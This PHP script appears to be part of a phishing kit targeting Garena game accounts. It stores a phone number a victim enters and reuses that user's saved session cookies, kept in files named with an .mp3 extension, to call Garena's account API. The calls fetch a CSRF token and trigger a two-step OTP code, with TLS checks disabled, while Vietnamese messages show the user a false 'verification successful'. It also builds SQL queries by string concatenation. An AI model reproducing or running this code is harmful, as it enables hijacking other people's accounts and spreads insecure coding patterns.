<?php
require_once ('../SystemLXT/Config.php');
// SOURCE by LE XUAN TRUONG;
function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
$PhoneGetLXT  = str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php'),array('','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($_GET['phone']))));
    $PHONECHECK =   $_SESSION['phone'];
    $SESSIONPHONE = substr($PHONECHECK, -4);
    $InputPhone = substr($PhoneGetLXT, -4); 
    $tk = ChecKLogin();
if ($PhoneGetLXT == null)
{
     echo '{"error": "Vui lòng nhập số điện thoại"}';
}
else if ($InputPhone !== $SESSIONPHONE)
{
    echo '{"error": "Số điện thoại bạn nhập không khớp với số điện thoại trên tài khoản!"}';
}
else {
     mysqli_query($Connect,"UPDATE `account_main` SET `sdtz` =  '{$PhoneGetLXT}' where `user`='".$tk."'");
   
     
     
  
    
     	$c = curl_init();
        	curl_setopt($c, CURLOPT_URL, "https://account.garena.com/api/account/preflight");
        	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
        	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        	curl_setopt($c, CURLOPT_HEADER, 1);
        	curl_setopt($c, CURLOPT_COOKIEJAR, "../login/cookie/".$tk.".mp3");
        	curl_setopt($c, CURLOPT_COOKIEFILE, "../login/cookie/".$tk.".mp3");
        	curl_setopt($c, CURLOPT_POST, 1);
        	curl_setopt($c, CURLOPT_POSTFIELDS, 1);
        	$rq4 = curl_exec($c);
        	curl_close($c);
        	if (stristr($rq4,'csrf'))
        	{
        		$token = get_string_between($rq4,'__csrf__=',';');
        		$headers = array(
        			'x-csrf-token: '.$token.'',
        			'X-Requested-With: XMLHttpRequest'
        		);
        		$_SESSION['header_1'] = $headers;
        		$c = curl_init();
        		curl_setopt($c, CURLOPT_URL, "https://account.garena.com/api/account/code/get");
        		curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        		curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
        		curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        		curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        		curl_setopt($c, CURLOPT_HTTPHEADER, $headers);
        		curl_setopt($c, CURLOPT_COOKIEJAR, "../login/cookie/".$tk.".mp3");
        		curl_setopt($c, CURLOPT_COOKIEFILE, "../login/cookie/".$tk.".mp3");
        		curl_setopt($c, CURLOPT_POST, 1);
        		curl_setopt($c, CURLOPT_POSTFIELDS, '{"template_id":"send_otp_game2step"}');
        		$rq5 = curl_exec($c);
        		curl_close($c);
        		if (stristr($rq5,'"status":0'))
        		{
        			$_SESSION['xacminh'] = 1;
        			$_SESSION['show'] = $_SESSION['concac'];
        		}
        		else if (stristr($rq5,'"status":6'))
        		{
        		    
        		 if(!isset($_SESSION['active_count'])){
                    $_SESSION['active_count'] = 55;
                    $_SESSION['time_started'] = time();
                    }
                    $RemainLXT = time() - $_SESSION['time_started'];
                    $TimeLXT = abs($_SESSION['active_count'] - $RemainLXT);   
        		    
        		    echo '{"code": "0", "error": "Thao tác quá nhanh. Hãy đợi '.$TimeLXT.' giây nữa và bấm Xác Thực Lại"}';
        		    exit();
        		   
        		}

        	}
        	
     
     
     if ($_SESSION['checkauhen'] == 1){
         
      echo '{"code": "2", "error": "Xác minh số điện thoại thành công. Xin chờ..."}';
     }
     else {
      echo '{"code": "1", "error": "Xác minh số điện thoại thành công. Xin chờ..."}';
     
     }

}